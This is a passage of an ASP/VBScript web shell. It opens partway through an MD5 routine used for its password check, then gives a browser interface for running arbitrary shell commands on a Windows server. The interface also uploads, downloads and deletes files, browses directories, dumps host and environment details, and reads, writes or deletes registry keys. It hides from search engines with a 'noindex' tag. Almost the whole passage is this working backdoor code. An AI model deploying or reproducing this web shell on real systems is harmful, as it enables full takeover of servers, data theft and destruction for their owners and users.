        HH  c, d, a, b, x(k + 15), S33, &H1FA27CF8
        HH  b, c, d, a, x(k + 2),  S34, &HC4AC5665
        II  a, b, c, d, x(k + 0),  S41, &HF4292244
        II  d, a, b, c, x(k + 7),  S42, &H432AFF97
        II  c, d, a, b, x(k + 14), S43, &HAB9423A7
        II  b, c, d, a, x(k + 5),  S44, &HFC93A039
        II  a, b, c, d, x(k + 12), S41, &H655B59C3
        II  d, a, b, c, x(k + 3),  S42, &H8F0CCC92
        II  c, d, a, b, x(k + 10), S43, &HFFEFF47D
        II  b, c, d, a, x(k + 1),  S44, &H85845DD1
        II  a, b, c, d, x(k + 8),  S41, &H6FA87E4F
        II  d, a, b, c, x(k + 15), S42, &HFE2CE6E0
        II  c, d, a, b, x(k + 6),  S43, &HA3014314
        II  b, c, d, a, x(k + 13), S44, &H4E0811A1
        II  a, b, c, d, x(k + 4),  S41, &HF7537E82
        II  d, a, b, c, x(k + 11), S42, &HBD3AF235
        II  c, d, a, b, x(k + 2),  S43, &H2AD7D2BB
        II  b, c, d, a, x(k + 9),  S44, &HEB86D391
        a = AddUnsigned(a, AA)
        b = AddUnsigned(b, BB)
        c = AddUnsigned(c, CC)
        d = AddUnsigned(d, DD)
    Next
    MD5 = WordToHex(a) & WordToHex(b) & WordToHex(c) & WordToHex(d)
End Function

' Destroys all objects and finishes the work.
Private Sub StopScript()
	Set sMD5Hash  = nothing
	Set WShell    = nothing
	Set WNetwork  = nothing
	Set WEnv      = nothing
	Set FSO       = nothing
	Set BinStream = nothing
	Set sURL      = nothing
	Set sCmd      = nothing
	Set bBgMode   = nothing
	Set bSI       = nothing
	Set sKey      = nothing
	Set sKeyFunc  = nothing
	Set sKeyValue = nothing
	Set sKeyType  = nothing
	Set sDir      = nothing
	Set sDel      = nothing
	Set sDL       = nothing
	Set sPasswd   = nothing
	Response.End
End Sub

' Password protection:
CheckAuth(sPasswd)

' Process multipart form-data:
If( InStr(1, CStr(Request.ServerVariables("CONTENT_TYPE")), "multipart/form-data;", 1) > 0 ) Then
	If Request.TotalBytes > 0 Then
  		UploadFile()
	End If
End If

%><%
'/* ---								File Download								--- */
If ( Not IsEmpty(sDL) ) Then
	On Error Resume Next
	' Change locale to "en-us":
	SetLocale(1033)
	If ( FSO.FileExists(sDL) ) Then
		Response.Buffer = True
		Response.Clear
		Call Response.AddHeader("Content-Disposition", "attachment; filename=""" & FSO.GetFileName(sDL) & """")
		Call Response.AddHeader("Content-Length", FSO.GetFile(sDL).Size)
		'Response.Charset     = "UTF-8"
		Response.ContentType = "application/binary"
		' Try to create ADODB COM object:
		Err.Clear
		Set BinStream = Server.CreateObject("ADODB.Stream")
		If ( Err.Number = 0 ) Then
			BinStream.Type = 1 : Rem adTypeBinary
			'BinStream.Charset = "ASCII"
			BinStream.Open()
			BinStream.LoadFromFile(sDL)
			Response.BinaryWrite(BinStream.Read())
		Else
			' Use FSO (slow & buggy method) instead.
			' Usually works only with text data:
			Err.Clear
			Set BinStream = FSO.OpenTextFile(sDL, 1, 0)
			While Not BinStream.AtEndOfStream
				Response.BinaryWrite(ChrB( Asc( BinStream.Read(1) ) ) )
			Wend
			BinStream.Close
		End If
		'Response.Flush
		Set BinStream = nothing
	Else
		Response.Write("File: " & sDL & " doesn't exist.")
	End If
	' Error handling:
    If ( Err.Number <> 0 ) Then
		Response.Write("Error: '" & Err.Description & "' [" & Err.Number & "]")
		Err.Clear
    End If
	StopScript
End If
%><%
'/* ---								HTML Pages Header							--- */
%><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=windows-1252">
<meta name="robots" content="noindex">
<meta http-equiv="expires" content="0">
<meta http-equiv="pragma" content="no-cache">
<style type="text/css"><!--
body { font-family: sans-serif; background-color: #ffffff; color: #000000; }
table { border-collapse: collapse; font-family: arial, sans-serif; white-space: pre; empty-cells: show; }
td, th { border: 1px solid #909090; font-size: 75%; vertical-align: center; }
th { background-color: #9999cc; }
tr { background-color: #ccccff; text-indent: 5pt; }
tr th  { text-indent: 0; }
tr.drv { text-indent: 0; }
tr.dir { font-weight: bold; }
tr.dir:hover  { background-color: #eeeeee; }
tr.file:hover { background-color: #eeeeee; }
td.dir  { cursor: hand; }
td.file { cursor: hand; }
input, select { font-family: verdana, arial; font-size: 11px; text-decoration: none; border: 1px solid #000000; }
input:hover, select:hover, input:focus, select:focus { border-color: #bc0000; }
input.button { width: 10%; }
input.button:hover { color: #444444; }
.link { color: 0033cc; text-decoration: none; font-style: oblique; }
.link:hover { background-color: #eeeeee; text-decoration: underline; }
i {color: #666666; }
hr {width: 100%; align: center; background-color: #cccccc; border: 0px; height: 1px; }
pre { margin: 0px; font-family: monospace; }
//--></style>
<%
'/* ---								Delete item									--- */
If ( Not IsEmpty(sDel) ) Then
	On Error Resume Next
	If ( Right(sDel, 1) = "\" ) Then
		If ( FSO.FolderExists(sDel) ) Then 
			FSO.DeleteFolder(Left(sDel, Len(sDel) - 1))
   		End If
	Else
		If ( FSO.FileExists(sDel) ) Then 
	    	FSO.DeleteFile(sDel)
   		End If
	End If
	' Error handling:
    If ( Err.Number <> 0 ) Then
		Response.Write("Error: '" & Err.Description & "' [" & Err.Number & "]")
		Err.Clear
    End If
End If
'/* ---								Directory Listing							--- */
If ( Not IsEmpty(sDir) ) Then
%>
<title>[ Directory Listing ]</title>
<script language="JavaScript" type="text/javascript">
<!--
function go(dir_name) {
	<% 
	On Error Resume Next
	If ( Not FSO.GetFolder(GetCorrectPath(sDir)).IsRootFolder ) Then %>
	if( dir_name == ".." )
		document.path.DIR.value = '<%= Replace(FSO.GetFolder(GetCorrectPath(sDir)).ParentFolder.Path, "\", "\\") %>';
	else
		document.path.DIR.value = '<%= Replace(GetCorrectPath(sDir), "\", "\\") %>' + '\\' + dir_name;
	<% Else %>
	document.path.DIR.value = '<%= Replace(GetCorrectPath(sDir), "\", "\\") %>' + dir_name;
	<% End If %>
	document.path.submit();
	}
function dl(file_name) {
	<% 
	On Error Resume Next
	If ( Not FSO.GetFolder(GetCorrectPath(sDir)).IsRootFolder ) Then %>
	document.download.DL.value = '<%= Replace(GetCorrectPath(sDir), "\", "\\") %>' + '\\' + file_name;
	<% Else %>
	document.download.DL.value = '<%= Replace(GetCorrectPath(sDir), "\", "\\") %>' + file_name;
	<% End If %>
	document.download.submit();
	}
function del(item_name) {
	<% On Error Resume Next %>
	if( !confirm("Are you sure you want to delete [" + item_name + "] ?")) 
		return false;
	<% If ( Not FSO.GetFolder(GetCorrectPath(sDir)).IsRootFolder ) Then %>
	document.items.DEL.value = '<%= Replace(GetCorrectPath(sDir), "\", "\\") %>' + '\\' + item_name;
	<% Else %>
	document.items.DEL.value = '<%= Replace(GetCorrectPath(sDir), "\", "\\") %>' + item_name;
	<% End If %>
	document.items.submit();
	}
-->
</script>
</head>
<body>
<%= InsertNavBar() %>
<%= "Computer name: <i>" & WNetwork.ComputerName & "</i>" %>
<br>
<%= "User: <i>" & WNetwork.UserName & "</i>" %>
<br>
<%= "Path: <i>" & Server.Mappath(Request.ServerVariables("PATH_INFO")) & "</i>" %>
<br><br>
<%= ShowDirectoryList(sDir) %>
<%  
'/* ---								Shell										--- */
ElseIf ( Not IsEmpty(sCmd) ) Then 
%>
<title><%= GetFirstWord(sCmd) %></title>
</head>
<body>
<%= InsertNavBar() %>
<%= "Computer name: <i>" & WNetwork.ComputerName & "</i>" %>
<br>
<%= "User: <i>" & WNetwork.UserName & "</i>" %>
<br>
<%= "Path: <i>" & Server.Mappath(Request.ServerVariables("PATH_INFO")) & "</i>" %>
<br><br>
<b>Shell command:</b>
<br>
<form name="shell" action="<%= sURL %>" method="POST">
<input type="text" name="CMD" size="45" style="width:100%;" value="<%= Server.HTMLEncode(sCmd) %>">
<br><br>
<input type="checkbox" name="CMD_M" id="BG" <%If (bBgMode <> "") Then Response.Write("checked") End If%>>
<label for="BG">Background mode</label>
<br><br>
<input type="submit" class="button" value="Execute">&nbsp;
<input type="button" class="button" value="Clear" onclick="document.shell.CMD.value=''">
</form>
<hr>
<pre>
<%
If ( sCmd <> "" ) Then 
	Call ExecuteCmd(sCmd, bBgMode)
Else
	Response.Write("Enter the command.")
End If
%>
</pre>
<%  
'/* ---								Server Info									--- */ 
ElseIf( Not IsEmpty(bSI) ) Then
%>
<title>[ Server Info For: <%= WNetwork.ComputerName %> ]</title>
</head>
<body>
<%= InsertNavBar() %>
<center>
<br><br>
<%= ShowDrivesInfo() %>
<br><br>
<table border="1" cellspacing="0" cellpadding="0" width="620">
<tr align="center"><th colspan="2">Environment</th></tr>
<tr><td>COMPUTER</td><td><%= WNetwork.ComputerName %></td></tr>
<tr><td>PATH_INFO</td><td><%= Server.Mappath(Request.ServerVariables("PATH_INFO")) %></td></tr>
<tr><td>USER</td><td><%= EmptyToNbsp(WNetwork.UserName) %></td></tr>
<tr><td>DOMAIN</td><td><%= EmptyToNbsp(WNetwork.UserDomain) %></td></tr>
<tr><td>SERVER_SOFTWARE</td><td><%= Request.ServerVariables("SERVER_SOFTWARE") %></td></tr>
<tr><td>SERVER_NAME</td><td><%= Request.ServerVariables("SERVER_NAME") %></td></tr>
<tr><td>LOCAL_ADDR</td><td><%= Request.ServerVariables("LOCAL_ADDR") %></td></tr>
<tr><td>NUMBER_OF_PROCESSORS</td><td><%= WEnv("NUMBER_OF_PROCESSORS") %></td></tr>
<tr><td>PROCESSOR_ARCHITECTURE</td><td><%= WEnv("PROCESSOR_ARCHITECTURE") %></td></tr>
<tr><td>PROCESSOR_IDENTIFIER</td><td><%= EmptyToNbsp(WEnv("PROCESSOR_IDENTIFIER")) %></td></tr>
<tr><td>PROCESSOR_LEVEL</td><td><%= EmptyToNbsp(WEnv("PROCESSOR_LEVEL")) %></td></tr>
<tr><td>PROCESSOR_VERSION</td><td><%= EmptyToNbsp(WEnv("PROCESSOR_VERSION")) %></td></tr>
<tr><td>OS</td><td><%= EmptyToNbsp(WEnv("OS")) %></td></tr>
<tr><td>COMSPEC</td><td><%= EmptyToNbsp(WEnv("COMSPEC")) %></td></tr>
<tr><td>HOMEDRIVE</td><td><%= EmptyToNbsp(WEnv("HOMEDRIVE")) %></td></tr>
<tr><td>HOMEPATH</td><td><%= EmptyToNbsp(WEnv("HOMEPATH")) %></td></tr>
<tr><td>PATH</td><td><%= Replace(EmptyToNbsp(WEnv("PATH")), ";", "<br>&nbsp; ") %></td></tr>
<tr><td>PATHEXT</td><td><%= EmptyToNbsp(WEnv("PATHEXT")) %></td></tr>
<tr><td>PROMPT</td><td><%= EmptyToNbsp(WEnv("PROMPT")) %></td></tr>
<tr><td>SYSTEMDRIVE</td><td><%= EmptyToNbsp(WEnv("SYSTEMDRIVE")) %></td></tr>
<tr><td>SYSTEMROOT</td><td><%= EmptyToNbsp(WEnv("SYSTEMROOT")) %></td></tr>
<tr><td>WINDIR</td><td><%= EmptyToNbsp(WEnv("WINDIR")) %></td></tr>
<tr><td>TEMP</td><td><%= EmptyToNbsp(WEnv("TEMP")) %></td></tr>
<tr><td>TMP</td><td><%= EmptyToNbsp(WEnv("TMP")) %></td></tr>
<tr><td>SCRIPT_ENGINE</td><td><%= ScriptEngine %> (Ver.<%= ScriptEngineMajorVersion %>.<%= ScriptEngineMinorVersion %>.<%= ScriptEngineBuildVersion %>)</td></tr>
<tr><td>ADODB.STREAM</td><td><%
	' Try to create ADODB COM object:
	On Error Resume Next
	Err.Clear
	Set BinStream = Server.CreateObject("ADODB.Stream")
	If ( Err.Number = 0 ) Then
		Response.Write("Passed")
	Else
		Response.Write("Limited download / upload functionality")
	End If
%>
</td></tr>
<tr><td>LOCALE</td><td><%= SetLocale(0) %></td></tr>
</table>
<br><br>
</center>
<%
'/* ---								Registry Editor								--- */
ElseIf ( Not IsEmpty(sKey) ) Then 
%>
<title>[ Registry Editor ]</title>
</head>
<body>
<%= InsertNavBar() %>
<%= "Computer name: <i>" & WNetwork.ComputerName & "</i>" %>
<br>
<%= "User: <i>" & WNetwork.UserName & "</i>" %>
<br>
<%= "Path: <i>" & Server.Mappath(Request.ServerVariables("PATH_INFO")) & "</i>" %>
<br><br>
<b>Registry key:</b>
<br>
<form name="regedit" action="<%= sURL %>" method="POST">
<input type="text" name="RKEY" size="45" style="width:100%;" value="<%= sKey %>">
<br><br>
<b>Value:</b>
<br>
<input type="text" name="RKEY_V" size="45" style="width:100%;" value="<%= sKeyValue %>">
<br><br>
<b>Type:</b>
<br>
<select name="RKEY_T" style="width: 150px" size="1">
<option value="REG_SZ" <%If ( sKeyType = "REG_SZ" or IsEmpty(sKeyType)  ) Then Response.Write("selected") End If%>>REG_SZ</option>
<option value="REG_DWORD" <%If ( sKeyType = "REG_DWORD" ) Then Response.Write("selected") End If%>>REG_DWORD</option>
<option value="REG_BINARY" <%If ( sKeyType = "REG_BINARY" ) Then Response.Write("selected") End If%>>REG_BINARY</option>
<option value="REG_EXPAND_SZ" <%If ( sKeyType = "REG_EXPAND_SZ" ) Then Response.Write("selected") End If%>>REG_EXPAND_SZ</option>
</select>
<br><br>
<b>Function:</b>
<br>
<input type="radio" name="RKEY_F" value="Read" <%If ( sKeyFunc = "Read" or IsEmpty(sKeyFunc)  ) Then Response.Write("checked") End If%>>
<label for="RKEY_F">Read</label><br>
<input type="radio" name="RKEY_F" value="Write" <%If (sKeyFunc = "Write") Then Response.Write("checked") End If%>>
<label for="RKEY_F">Write</label><br>
<input type="radio" name="RKEY_F" value="Delete" <%If (sKeyFunc = "Delete") Then Response.Write("checked") End If%>>
<label for="RKEY_F">Delete</label><br>
<br>
<input type="submit" class="button" value="Execute">&nbsp;
<input type="button" class="button" value="Clear" onclick="document.regedit.RKEY.value='';document.regedit.RKEY_V.value=''">
</form>
<hr>
<pre>
<%
If ( sKey <> "" ) Then 
	Call RegEditor(sKey, sKeyValue, sKeyType, sKeyFunc)
Else
	Response.Write("Enter the key.")
End If
%>
</pre>
<%  
End If
'/* ---								HTML Pages Footer							--- */
%>
</body>
</html>


<%
StopScript 'asd
%>